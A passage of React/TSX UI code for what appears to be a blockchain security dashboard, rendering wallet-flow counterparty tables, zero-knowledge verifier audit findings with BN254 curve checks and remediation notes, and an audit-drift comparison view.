              </div>
            )}

            {/* Top Senders & Top Receivers Counterparty Tables */}
            {(result.top_senders?.length > 0 || result.top_receivers?.length > 0) && (
              <div className="grid grid-cols-1 gap-3 lg:grid-cols-2 text-xs">
                <div className="rounded-xl border border-border bg-background p-4 space-y-2">
                  <p className="text-[10px] uppercase text-emerald-400 font-bold">
                    📥 Top Inflow Sources (Senders)
                  </p>
                  {(result.top_senders || []).map((s: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between gap-2 rounded border border-border bg-card px-3 py-2">
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center gap-1.5">
                          <span>{s.icon}</span>
                          <span className="font-bold text-foreground truncate">{s.label}</span>
                          {s.is_bot && <span className="rounded bg-amber-500/20 px-1.5 py-0.5 text-[9px] text-amber-400">BOT</span>}
                        </div>
                        <p className="text-[10px] text-muted-foreground truncate select-all">{s.address}</p>
                      </div>
                      <div className="text-right">
                        <p className="font-bold text-emerald-400">+{fmt(s.amount)} {s.symbol}</p>
                        <p className="text-[10px] text-muted-foreground">{s.share_pct}%</p>
                      </div>
                    </div>
                  ))}
                </div>

                <div className="rounded-xl border border-border bg-background p-4 space-y-2">
                  <p className="text-[10px] uppercase text-destructive font-bold">
                    📤 Top Outflow Destinations (Receivers)
                  </p>
                  {(result.top_receivers || []).map((r: any, idx: number) => (
                    <div key={idx} className="flex items-center justify-between gap-2 rounded border border-border bg-card px-3 py-2">
                      <div className="min-w-0 flex-1">
                        <div className="flex items-center gap-1.5">
                          <span>{r.icon}</span>
                          <span className="font-bold text-foreground truncate">{r.label}</span>
                          {r.is_bot && <span className="rounded bg-amber-500/20 px-1.5 py-0.5 text-[9px] text-amber-400">BOT</span>}
                        </div>
                        <p className="text-[10px] text-muted-foreground truncate select-all">{r.address}</p>
                      </div>
                      <div className="text-right">
                        <p className="font-bold text-destructive">-{fmt(r.amount)} {r.symbol}</p>
                        <p className="text-[10px] text-muted-foreground">{r.share_pct}%</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Detected Clusters & Signals */}
            {result.clusters_detail?.length > 0 && (
              <div className="rounded-xl border border-border bg-background p-4 space-y-2 text-xs">
                <p className="text-[10px] uppercase text-primary font-bold">
                  🕸️ {isRu ? `Обнаруженные кластеры связанных кошельков (${result.cluster_count})` : `Detected Coordinated Wallet Clusters (${result.cluster_count})`}
                </p>
                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                  {result.clusters_detail.map((cl: any, ci: number) => (
                    <div key={ci} className="rounded border border-border bg-card p-3 space-y-1">
                      <div className="flex justify-between">
                        <span className="font-bold text-primary">{cl.cluster_id}</span>
                        <span className="text-muted-foreground">{cl.size} wallets</span>
                      </div>
                      <p className="text-[10px] text-muted-foreground break-all">
                        {(cl.members || []).join(", ")}
                      </p>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {result.signals?.length > 0 && (
              <div className="space-y-2">
                <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  {isRu ? "Сигналы аномалий потока" : "Flow Anomaly Signals"}
                </p>
                {result.signals.map((s: any, i: number) => (
                  <div key={i} className="rounded-lg border border-border bg-background p-3 text-xs">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-foreground">{s.type}</span>
                      <span className="text-[10px] text-primary font-bold">{s.severity} · {s.confidence}%</span>
                    </div>
                    <p className="mt-1 text-[11px] text-muted-foreground">{s.description}</p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {result && tool === "zk" && (
        <div className="rounded-xl border border-border bg-card p-5 space-y-5 font-mono text-xs">
          {/* Header: Target Address, Proving System Badge & Soundness Verdict */}
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
            <div className="flex flex-wrap items-center gap-2">
              <span className="rounded-md border border-primary/50 bg-primary/15 px-2.5 py-1 text-xs font-bold uppercase text-primary">
                📐 {result.proving_system || result.radar_metadata?.proving_system || "GROTH16"}
              </span>
              {(result.display_name || result.protocol_name || result.contract_name || result.radar_metadata?.protocol_name || result.radar_metadata?.contract_name) && (
                <span className="rounded-md border border-emerald-500/40 bg-emerald-500/15 px-2.5 py-1 text-xs font-bold text-emerald-300">
                  🏛️ {result.display_name || result.protocol_name || result.contract_name || result.radar_metadata?.protocol_name || result.radar_metadata?.contract_name}
                </span>
              )}
              <code className="text-primary font-bold text-xs">{result.address}</code>
              <span className="rounded bg-background border border-border px-2 py-0.5 text-[10px] uppercase text-muted-foreground">
                {result.chain}
              </span>
              {result.radar_metadata?.archetype && (
                <span className="rounded border border-purple-500/40 bg-purple-500/10 px-2 py-0.5 text-[10px] font-bold text-purple-300">
                  {result.radar_metadata.archetype}
                </span>
              )}
            </div>
            <span
              className={`rounded-lg border px-3 py-1 text-[11px] font-bold ${
                (result.critical_count || 0) > 0
                  ? "border-red-500/60 bg-red-500/20 text-red-300"
                  : (result.high_count || 0) > 0
                  ? "border-amber-500/60 bg-amber-500/20 text-amber-300"
                  : "border-green-500/50 bg-green-500/15 text-green-400"
              }`}
            >
              {result.verdict || "ZK AUDIT COMPLETE"} · {isRu ? "Находок" : "Findings"}: {result.verifiers_found ?? (result.results?.length || 0)}
            </span>
          </div>

          {/* 0. LIVE ON-CHAIN BALANCE, TVL AT RISK, NONCE & CONTROLLING/DELEGATION CHECKER */}
          {result.onchain_liveness && (
            <div
              className={`rounded-xl border p-4 space-y-3 ${
                result.onchain_liveness.effective_tvl_usd > 0
                  ? "border-green-500/60 bg-green-500/10"
                  : result.onchain_liveness.is_controlling_or_delegated
                  ? "border-purple-500/50 bg-purple-500/10"
                  : result.onchain_liveness.effective_tx_count > 1
                  ? "border-cyan-500/50 bg-cyan-500/10"
                  : "border-border bg-background/70"
              }`}
            >
              <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border/60 pb-2.5">
                <div className="flex flex-wrap items-center gap-2">
                  <span className="font-bold text-xs text-foreground">
                    💰 {isRu ? "ОНЧЕЙН-ЧЕКЕР БАЛАНСОВ, NONCE И УПРАВЛЯЮЩИХ КОНТРАКТОВ (LIVE RPC):" : "LIVE ON-CHAIN BALANCE, NONCE & CONTROLLING CONTRACT CHECKER:"}
                  </span>
                  <span
                    className={`rounded-md border px-2.5 py-0.5 text-[11px] font-bold ${
                      result.onchain_liveness.effective_tvl_usd > 0
                        ? "border-green-500 bg-green-500/20 text-green-300"
                        : result.onchain_liveness.is_controlling_or_delegated
                        ? "border-purple-500 bg-purple-500/20 text-purple-300"
                        : result.onchain_liveness.effective_tx_count > 1
                        ? "border-cyan-500 bg-cyan-500/20 text-cyan-300"
                        : "border-border bg-card text-muted-foreground"
                    }`}
                  >
                    {result.onchain_liveness.liveness_badge}
                  </span>
                </div>
                <span className="text-xs font-bold text-green-400">
                  TVL / Balance: ${(result.onchain_liveness.effective_tvl_usd || 0).toLocaleString()} · Nonce/Tx: {result.onchain_liveness.effective_tx_count || 0}
                </span>
              </div>

              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 lg:grid-cols-4 text-[11px]">
                <div className="rounded-lg border border-border bg-card p-3">
                  <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Прямой баланс контракта" : "Direct Contract Balance"}</p>
                  <p className="mt-1 text-sm font-bold text-foreground">
                    {result.onchain_liveness.direct_contract?.native_balance ?? 0} {result.onchain_liveness.direct_contract?.native_symbol || "ETH"}{" "}
                    <span className="text-green-400">(${(result.onchain_liveness.direct_contract?.total_usd || 0).toLocaleString()})</span>
                  </p>
                  {result.onchain_liveness.direct_contract?.tokens &&
                    Object.keys(result.onchain_liveness.direct_contract.tokens).length > 0 && (
                      <p className="mt-0.5 text-[10px] text-cyan-300">
                        Tokens: {JSON.stringify(result.onchain_liveness.direct_contract.tokens)}
                      </p>
                    )}
                </div>

                <div className="rounded-lg border border-border bg-card p-3">
                  <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Ончейн Nonce / Вызовы" : "On-Chain Nonce / Txs"}</p>
                  <p className="mt-1 text-sm font-bold text-cyan-300">
                    Nonce: {result.onchain_liveness.direct_contract?.nonce ?? 0} · Txs: {result.onchain_liveness.effective_tx_count ?? 0}
                  </p>
                  <p className="mt-0.5 text-[10px] text-muted-foreground">
                    {result.onchain_liveness.is_empty_shell
                      ? isRu ? "Статус: Изолированный без транзакций" : "Stateless shell"
                      : isRu ? "Статус: Живой активный контракт" : "Active contract"}
                  </p>
                </div>

                <div className="rounded-lg border border-border bg-card p-3">
                  <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Роль / Делегация / Прокси" : "Role / Delegation / Proxy"}</p>
                  <p className="mt-1 text-xs font-bold text-purple-300">
                    {result.onchain_liveness.eip1967_implementation
                      ? `🔀 EIP-1967 Proxy → ${result.onchain_liveness.eip1967_implementation.slice(0, 10)}…`
                      : result.onchain_liveness.has_delegatecall
                      ? "🔀 Uses DELEGATECALL (Library/Proxy)"
                      : result.onchain_liveness.is_controlling_or_delegated
                      ? "🏛️ Linked to Controlling Pool/Bridge"
                      : "📐 Standalone Math Verifier"}
                  </p>
                </div>

                <div className="rounded-lg border border-border bg-card p-3">
                  <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Связанный Пул / Вызыватель (TVL)" : "Linked Pool / Caller (TVL)"}</p>
                  {result.onchain_liveness.linked_partner ? (
                    <div className="mt-1 space-y-1">
                      <p className="truncate font-bold text-primary" title={result.onchain_liveness.linked_partner.address}>
                        {result.onchain_liveness.linked_partner.address}
                      </p>
                      <p className="text-[10px] text-green-400 font-bold">
                        💰 ${Number(result.onchain_liveness.linked_partner.total_usd || 0).toLocaleString()} ({result.onchain_liveness.linked_partner.native_balance} {result.onchain_liveness.linked_partner.native_symbol}) · Nonce: {result.onchain_liveness.linked_partner.nonce}
                      </p>
                    </div>
                  ) : (
                    <p className="mt-1 text-xs text-muted-foreground">
                      {isRu ? "Прямой внешний пул не обнаружен" : "No external caller pool linked"}
                    </p>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* 1. Mathematical Verification Equation & Proving System Profile */}
          {result.proving_system_profile && (
            <div className="rounded-xl border border-primary/30 bg-background/80 p-4 space-y-3">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="font-bold text-primary text-xs">
                  🧮 {result.proving_system_profile.full_name}
                </span>
                <span className="rounded border border-cyan-500/40 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-bold text-cyan-300">
                  {result.proving_system_profile.curve}
                </span>
              </div>

              <div className="rounded-lg border border-border bg-card p-3 space-y-1.5">
                <p className="text-[10px] uppercase tracking-wider text-muted-foreground">
                  {isRu ? "Алгебраическое уравнение верификации (Pairing / Polynomial Identity):" : "Algebraic Verification Equation:"}
                </p>
                <p className="text-xs font-bold text-green-400 break-all">
                  {result.proving_system_profile.equation}
                </p>
                {result.proving_system_profile.alt_equation && (
                  <p className="text-[11px] text-muted-foreground break-all">
                    ⇔ {result.proving_system_profile.alt_equation}
                  </p>
                )}
              </div>

              <div className="grid grid-cols-1 gap-2.5 sm:grid-cols-2 lg:grid-cols-4 text-[11px]">
                <div className="rounded-lg border border-border bg-card p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Схема коммитментов" : "Commitment Scheme"}</p>
                  <p className="mt-1 font-semibold text-foreground">{result.proving_system_profile.commitment_scheme}</p>
                </div>
                <div className="rounded-lg border border-border bg-card p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Церемония / Setup" : "Trusted Setup"}</p>
                  <p className="mt-1 font-semibold text-foreground">{result.proving_system_profile.trusted_setup}</p>
                </div>
                <div className="rounded-lg border border-border bg-card p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Размер доказательства" : "Proof Size"}</p>
                  <p className="mt-1 font-semibold text-foreground">{result.proving_system_profile.proof_size}</p>
                </div>
                <div className="rounded-lg border border-border bg-card p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">{isRu ? "Вычислительная сложность" : "Verification Complexity"}</p>
                  <p className="mt-1 font-semibold text-foreground">{result.proving_system_profile.verification_complexity}</p>
                </div>
              </div>
            </div>
          )}

          {/* 2. Disassembled EVM Bytecode & Elliptic Curve Algebra Telemetry */}
          {result.math_bytecode_profile && (
            <div className="space-y-3">
              {result.math_bytecode_profile.linked_verifier && (
                <div className="rounded-lg border border-cyan-500/50 bg-cyan-500/15 px-3.5 py-2.5 text-[11px] text-cyan-300 flex flex-wrap items-center justify-between gap-2">
                  <span>
                    🔗 <b>{isRu ? "Авто-резолв внешнего верификатора:" : "Auto-Followed External Verifier:"}</b>{" "}
                    {isRu ? "Контракт пула/моста делегирует проверку доказательств через" : "Pool/Bridge delegates verification via"}{" "}
                    <code className="text-white font-bold">{result.math_bytecode_profile.linked_verifier.pointer_getter}</code>{" "}
                    → <code className="text-green-300 font-bold">{result.math_bytecode_profile.linked_verifier.verifier_address}</code>
                  </span>
                </div>
              )}

              <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-4 lg:grid-cols-8">
                <div className="rounded-lg border border-border bg-background p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">ecPairing (0x08)</p>
                  <p className="mt-1 text-sm font-bold text-primary">
                    {result.math_bytecode_profile.precompiles?.ecpairing_0x08 ?? 0} calls
                  </p>
                </div>
                <div className="rounded-lg border border-border bg-background p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">ecMul / ecAdd</p>
                  <p className="mt-1 text-sm font-bold text-foreground">
                    {result.math_bytecode_profile.precompiles?.ecmul_0x07 ?? 0} / {result.math_bytecode_profile.precompiles?.ecadd_0x06 ?? 0}
                  </p>
                </div>
                <div className="rounded-lg border border-border bg-background p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">ADDMOD / MULMOD</p>
                  <p className="mt-1 text-sm font-bold text-amber-300">
                    {result.math_bytecode_profile.opcodes?.addmod ?? 0} / {result.math_bytecode_profile.opcodes?.mulmod ?? 0}
                  </p>
                </div>
                <div className="rounded-lg border border-border bg-background p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">KECCAK256 (Transcript)</p>
                  <p className="mt-1 text-sm font-bold text-purple-300">
                    {result.math_bytecode_profile.opcodes?.keccak256 ?? 0}
                  </p>
                </div>
                <div className="rounded-lg border border-border bg-background p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">G₁ Points (𝔽_p)</p>
                  <p className="mt-1 text-sm font-bold text-cyan-300">
                    {result.math_bytecode_profile.valid_g1_points_count ?? 0} on curve
                  </p>
                </div>
                <div className="rounded-lg border border-border bg-background p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">G₂ Twist (𝔽_p²)</p>
                  <p className={`mt-1 text-sm font-bold ${(result.math_bytecode_profile.duplicate_g2_twist_points ?? 0) > 0 ? "text-red-400" : "text-green-400"}`}>
                    {result.math_bytecode_profile.valid_g2_points_count ?? 0} pts ({result.math_bytecode_profile.duplicate_g2_twist_points ?? 0} dup)
                  </p>
                </div>
                <div className="rounded-lg border border-border bg-background p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">Base Field p (Fq)</p>
                  <p className={`mt-1 text-xs font-bold ${result.math_bytecode_profile.has_base_prime_p ? "text-green-400" : "text-amber-400"}`}>
                    {result.math_bytecode_profile.has_base_prime_p ? "✅ Embedded" : "⚠️ Implicit"}
                  </p>
                </div>
                <div className="rounded-lg border border-border bg-background p-2.5">
                  <p className="text-[9px] uppercase text-muted-foreground">Scalar Field r (Fr)</p>
                  <p className={`mt-1 text-xs font-bold ${result.math_bytecode_profile.has_scalar_prime_r ? "text-green-400" : "text-red-400"}`}>
                    {result.math_bytecode_profile.has_scalar_prime_r ? "✅ Checked (< r)" : "🔴 No < r Check"}
                  </p>
                </div>
              </div>

              {/* Extracted Valid BN254 G2 Sextic Twist Points Sample */}
              {Array.isArray(result.math_bytecode_profile.valid_g2_points_sample) &&
                result.math_bytecode_profile.valid_g2_points_sample.length > 0 && (
                  <details className="rounded-lg border border-purple-500/40 bg-background p-3">
                    <summary className="cursor-pointer font-bold text-[11px] text-purple-300">
                      🔮 {isRu
                        ? `Показать реконструированные точки секстического твиста G₂ ∈ E'(𝔽_p²): Y² ≡ X³ + 3/(9+i) (${result.math_bytecode_profile.valid_g2_points_count} точек, дубликатов γ==δ: ${result.math_bytecode_profile.duplicate_g2_twist_points || 0})`
                        : `Show reconstructed sextic twist G₂ ∈ E'(𝔽_p²) points (${result.math_bytecode_profile.valid_g2_points_count} points, γ==δ duplicates: ${result.math_bytecode_profile.duplicate_g2_twist_points || 0})`}
                    </summary>
                    <div className="mt-2.5 grid grid-cols-1 gap-2 sm:grid-cols-2 text-[10px]">
                      {result.math_bytecode_profile.valid_g2_points_sample.map((pt: any, idx: number) => (
                        <div key={idx} className={`rounded border p-2.5 ${pt.is_duplicate ? "border-red-500/60 bg-red-500/10" : "border-border/70 bg-card"}`}>
                          <div className="flex items-center justify-between">
                            <span className="font-bold text-purple-300">
                              G₂ Twist Point #{pt.index} {pt.is_generator_g2 ? "([1]₂ Canonical Generator)" : "([β]₂ / [γ]₂ / [δ]₂ / [τ]₂)"}
                            </span>
                            <span className={pt.is_duplicate ? "text-red-400 font-bold" : "text-green-400"}>
                              {pt.is_duplicate ? "🔴 DUPLICATE [γ]₂ == [δ]₂" : "✓ Y² = X³ + 3/(9+i) in 𝔽_p²"}
                            </span>
                          </div>
                          <p className="truncate text-muted-foreground mt-1">X₀: {pt.x0}</p>
                          <p className="truncate text-muted-foreground">X₁: {pt.x1}</p>
                          <p className="truncate text-muted-foreground">Y₀: {pt.y0}</p>
                          <p className="truncate text-muted-foreground">Y₁: {pt.y1}</p>
                        </div>
                      ))}
                    </div>
                  </details>
                )}

              {/* Extracted Valid BN254 G1 Curve Points Sample */}
              {Array.isArray(result.math_bytecode_profile.valid_g1_points_sample) &&
                result.math_bytecode_profile.valid_g1_points_sample.length > 0 && (
                  <details className="rounded-lg border border-border bg-background p-3">
                    <summary className="cursor-pointer font-bold text-[11px] text-cyan-300">
                      🧬 {isRu
                        ? `Показать извлечённые из байткода точки кривой G₁ (y² ≡ x³ + 3 mod p): подтверждено ${result.math_bytecode_profile.valid_g1_points_count} точек на BN254`
                        : `Show extracted on-curve G₁ points (y² ≡ x³ + 3 mod p): ${result.math_bytecode_profile.valid_g1_points_count} valid BN254 points`}
                    </summary>
                    <div className="mt-2.5 grid grid-cols-1 gap-1.5 sm:grid-cols-2 text-[10px]">
                      {result.math_bytecode_profile.valid_g1_points_sample.map((pt: any, idx: number) => (
                        <div key={idx} className="rounded border border-border/70 bg-card p-2">
                          <div className="flex items-center justify-between">
                            <span className="font-bold text-primary">G₁ Point #{pt.index} (IC / VK)</span>
                            <span className={pt.is_duplicate ? "text-red-400 font-bold" : "text-green-400"}>
                              {pt.is_duplicate ? "⚠️ DUPLICATE IC_i" : "✓ y² = x³ + 3 (mod p)"}
                            </span>
                          </div>
                          <p className="truncate text-muted-foreground mt-0.5">x: {pt.x}</p>
                          <p className="truncate text-muted-foreground">y: {pt.y}</p>
                        </div>
                      ))}
                    </div>
                  </details>
                )}
            </div>
          )}

          {/* 3. ZK Radar v5 Metadata & VK Fingerprint Cluster */}
          {result.radar_metadata && (
            <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-6">
              <div className="rounded-lg border border-border bg-background p-2.5">
                <p className="text-[9px] uppercase text-muted-foreground">ZK Radar v5 Status</p>
                <p className="mt-1 font-bold text-green-400">
                  ✅ {result.radar_metadata.setup_status || result.radar_metadata.discovery_method || "Indexed"}
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-2.5">
                <p className="text-[9px] uppercase text-muted-foreground">VK Fingerprint</p>
                <p className="mt-1 font-bold text-cyan-300">
                  {result.radar_metadata.vk_fingerprint_short || "—"}
                  {result.vk_siblings_count > 0 && (
                    <span className="ml-1.5 rounded bg-amber-500/20 px-1.5 py-0.5 text-[9px] text-amber-300">
                      +{result.vk_siblings_count} clones
                    </span>
                  )}
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-2.5">
                <p className="text-[9px] uppercase text-muted-foreground">γ == δ / G₂ Collision</p>
                <p className={`mt-1 font-bold ${result.radar_metadata.gamma_eq_delta ? "text-red-400" : result.radar_metadata.g2_generator_reuse ? "text-amber-300" : "text-green-400"}`}>
                  {result.radar_metadata.gamma_eq_delta
                    ? "🔴 γ == δ (CRITICAL)"
                    : result.radar_metadata.g2_generator_reuse
                    ? "🟠 G₂ SRS Reuse"
                    : "🟢 Distinct G₂"}
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-2.5">
                <p className="text-[9px] uppercase text-muted-foreground">Public Inputs / IC</p>
                <p className="mt-1 font-bold text-foreground">
                  {result.radar_metadata.public_inputs ?? "—"} inputs (IC={result.radar_metadata.ic_length ?? "—"})
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-2.5">
                <p className="text-[9px] uppercase text-muted-foreground">Bytecode / Block</p>
                <p className="mt-1 font-bold text-foreground">
                  {(result.radar_metadata.bytecode_size || 0).toLocaleString()}B · #{result.radar_metadata.deploy_block || "—"}
                </p>
              </div>
              <div className="rounded-lg border border-border bg-background p-2.5">
                <p className="text-[9px] uppercase text-muted-foreground">Deployer EOA</p>
                <p className="mt-1 truncate font-bold text-primary">
                  {result.radar_metadata.deployer || "—"}
                </p>
              </div>
            </div>
          )}

          {/* 4. Mathematical & Cryptographic Vulnerability Findings */}
          {Array.isArray(result.results) && result.results.length > 0 ? (
            <div className="space-y-2.5">
              <p className="text-[11px] font-bold uppercase tracking-wider text-muted-foreground">
                🔬 {isRu ? `Математические и криптографические находки (${result.results.length}):` : `Mathematical & Cryptographic Findings (${result.results.length}):`}
              </p>
              {result.results.map((f: any, idx: number) => {
                const sev = String(f.severity || "INFO").toUpperCase();
                return (
                  <div
                    key={idx}
                    className={`rounded-xl border p-3.5 space-y-2 ${
                      sev === "CRITICAL"
                        ? "border-red-500/50 bg-red-500/10"
                        : sev === "HIGH"
                        ? "border-amber-500/50 bg-amber-500/10"
                        : "border-border bg-background"
                    }`}
                  >
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <div className="flex flex-wrap items-center gap-2">
                        {f.detector_id && (
                          <span className="rounded bg-card border border-border px-2 py-0.5 text-[10px] font-bold text-primary">
                            {f.detector_id}
                          </span>
                        )}
                        <span className="font-bold text-foreground text-xs">
                          {f.title || f.type || f.vuln_type || "ZK Cryptographic Finding"}
                        </span>
                      </div>
                      <span
                        className={`rounded border px-2 py-0.5 text-[10px] font-bold ${
                          sev === "CRITICAL"
                            ? "border-red-500/60 bg-red-500/20 text-red-300"
                            : sev === "HIGH"
                            ? "border-amber-500/60 bg-amber-500/20 text-amber-300"
                            : "border-primary/40 bg-primary/10 text-primary"
                        }`}
                      >
                        {sev}
                      </span>
                    </div>
                    {f.description && (
                      <p className="text-[11px] text-muted-foreground leading-relaxed">{f.description}</p>
                    )}
                    {f.math_proof && (
                      <div className="rounded-lg border border-primary/30 bg-card/90 px-3 py-2 text-[11px] text-green-300">
                        <span className="font-bold text-primary">📐 {isRu ? "Математика вектора: " : "Math Proof: "}</span>
                        {f.math_proof}
                      </div>
                    )}
                    {f.code_snippet && (
                      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-2 text-[10px] text-muted-foreground">
                        {f.code_snippet}
                      </pre>
                    )}
                    {f.recommendation && (
                      <p className="text-[11px] text-cyan-300">
                        <span className="font-bold">🛡️ {isRu ? "Рекомендация: " : "Remediation: "}</span>
                        {f.recommendation}
                      </p>
                    )}
                  </div>
                );
              })}
            </div>
          ) : (
            <p className="text-[11px] text-muted-foreground">
              {isRu
                ? "Уязвимостей кривой BN254, gamma==delta, подгрупповых атак G1/G2, Frozen Heart или переполнения публичных входов не обнаружено."
                : "No BN254 curve membership, gamma==delta, G1/G2 subgroup, Frozen Heart, or public input overflow flaws detected."}
            </p>
          )}
        </div>
      )}

      {result && tool === "drift" && (
        <div className="space-y-4 font-mono text-xs">
          {result.mode === "repo_audit_drift" ? (
            <>
              <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
                {[
                  {
                    k: isRu ? "Найдено отчётов аудита" : "Audit Reports Found",
                    v: result.audits_exist ? `${result.audit_count} Reports` : isRu ? "0 (Нет PDF аудитов)" : "0 (No PDFs)",
                  },
                  {
                    k: isRu ? "Последний аудит / База" : "Last Audit / Baseline",
                    v: result.last_audit_date
                      ? `${result.last_audit_date}${result.audit_age_days ? ` (${result.audit_age_days}d · ${result.audit_recency})` : ""}`
                      : "—",
                  },
                  {
                    k: "Audit Drift Score",
                    v: `${result.drift_score ?? 0}/100`,
                  },
                  {
                    k: isRu ? "Общий риск дрифта" : "Overall Drift Risk",
                    v: result.overall_risk || "UNKNOWN",
                  },
                ].map((c, i) => (
                  <div key={i} className="rounded-xl border border-border bg-card p-4">
                    <p className="text-[10px] uppercase tracking-wider text-muted-foreground">{c.k}</p>
                    <p className="mt-1 text-base font-bold text-foreground">{c.v}</p>
                  </div>
                ))}
              </div>

              <div className="rounded-xl border border-border bg-card p-5 space-y-4">
                <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border pb-3">
                  <div>
                    <a
                      href={result.repo_url}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-sm font-bold text-primary hover:underline"
                    >
                      📦 {result.repo} ↗
                    </a>
                    {result.auditors?.length > 0 && (
                      <p className="mt-1 text-muted-foreground">
                        {isRu ? "Аудиторы:" : "Auditors:"}{" "}
                        <b className="text-foreground">{result.auditors.join(", ")}</b> ·{" "}
                        {isRu ? "Всего находок в PDF:" : "Total findings in PDFs:"}{" "}
                        <b className="text-primary">{result.total_audit_findings}</b>
                      </p>
                    )}
                  </div>
                  <span className="rounded border border-border bg-background px-2.5 py-1 text-[11px] text-muted-foreground">
                    Contracts: <b className="text-foreground">{result.repo_surface?.contracts_count ?? 0}</b> · Mocks/Tests:{" "}
                    <b className="text-foreground">{result.repo_surface?.mocks_and_tests_count ?? 0}</b> · Active Patterns:{" "}
                    <b className="text-primary">{result.repo_surface?.current_patterns_scanned ?? 0}</b>
                  </span>
                </div>

                {result.key_concerns?.length > 0 && (
                  <div className="space-y-1 rounded-lg border border-destructive/30 bg-destructive/10 p-3">
                    {result.key_concerns.map((kc: string, idx: number) => (
                      <p key={idx} className="text-destructive font-semibold">{kc}</p>
                    ))}
                  </div>
                )}

                {/* CLI Section: AUDIT vs CURRENT SCAN (Comparison & Severity Drift) */}
                {result.comparison && (
                  <div className="rounded-xl border border-primary/30 bg-background p-4 space-y-3">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                        ⚖️ AUDIT vs CURRENT SCAN (CLI Parity Comparison)
                      </p>
                      <div className="flex items-center gap-2 text-[11px]">
                        <span className="rounded border border-border bg-card px-2 py-0.5">
                          Coverage Score: <b className="text-primary">{result.comparison.coverage_score}/100</b>
                        </span>
                        <span className="rounded border border-destructive/40 bg-destructive/15 px-2 py-0.5 font-bold text-destructive">
                          New Risk: {result.comparison.new_risk_level}
                        </span>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-4 text-[11px]">
                      <div className="rounded border border-border bg-card p-2.5">
                        <p className="text-[10px] text-muted-foreground">Critical (Audit → Now)</p>
                        <p className="mt-1 font-bold text-foreground">
                          {result.comparison.audit_critical} → {result.comparison.current_critical}{" "}
                          <span className={result.comparison.critical_delta > 0 ? "text-destructive" : "text-emerald-400"}>
                            ({result.comparison.critical_delta >= 0 ? `+${result.comparison.critical_delta}` : result.comparison.critical_delta})
                          </span>
                        </p>
                      </div>
                      <div className="rounded border border-border bg-card p-2.5">
                        <p className="text-[10px] text-muted-foreground">High (Audit → Now)</p>
                        <p className="mt-1 font-bold text-foreground">
                          {result.comparison.audit_high} → {result.comparison.current_high}{" "}
                          <span className={result.comparison.high_delta > 0 ? "text-amber-400" : "text-emerald-400"}>
                            ({result.comparison.high_delta >= 0 ? `+${result.comparison.high_delta}` : result.comparison.high_delta})
                          </span>
                        </p>
                      </div>
                      <div className="rounded border border-border bg-card p-2.5">
                        <p className="text-[10px] text-muted-foreground">New Uncovered Issues</p>
                        <p className="mt-1 font-bold text-destructive">{result.comparison.new_issues_count}</p>
                      </div>
                      <div className="rounded border border-border bg-card p-2.5">
                        <p className="text-[10px] text-muted-foreground">Unaudited Contracts</p>
                        <p className="mt-1 font-bold text-amber-400">{result.comparison.unaudited_files_count}</p>
                      </div>
                    </div>

                    {result.comparison.uncovered_categories?.length > 0 && (
                      <div className="flex flex-wrap items-center gap-1.5 text-[11px]">
                        <span className="text-muted-foreground">Uncovered Vulnerability Classes:</span>
                        {result.comparison.uncovered_categories.map((uc: string, ui: number) => (
                          <span key={ui} className="rounded border border-amber-500/40 bg-amber-500/10 px-2 py-0.5 text-[10px] text-amber-300">
                            {uc}
                          </span>
                        ))}
                      </div>
                    )}

                    {result.comparison.new_issues?.length > 0 && (
                      <div className="space-y-1.5 pt-1">
                        <p className="text-[10px] uppercase text-muted-foreground font-bold">
                          {isRu ? "Новые паттерны в коде, не покрытые аудитом (File : Line):" : "New Code Patterns Not Covered by Audits (File : Line):"}
                        </p>
                        <div className="max-h-48 overflow-y-auto space-y-1 pr-1">
                          {result.comparison.new_issues.slice(0, 15).map((ni: any, nii: number) => (
                            <div key={nii} className="flex flex-wrap items-center justify-between gap-2 rounded border border-border bg-card px-2.5 py-1.5 text-[11px]">
                              <div className="flex items-center gap-2">
                                <span className="rounded bg-primary/15 px-1.5 py-0.5 text-[9px] font-bold text-primary">
                                  {ni.severity}
                                </span>
                                <span className="font-bold text-foreground">{ni.type}</span>
                              </div>
                              <code className="text-muted-foreground">
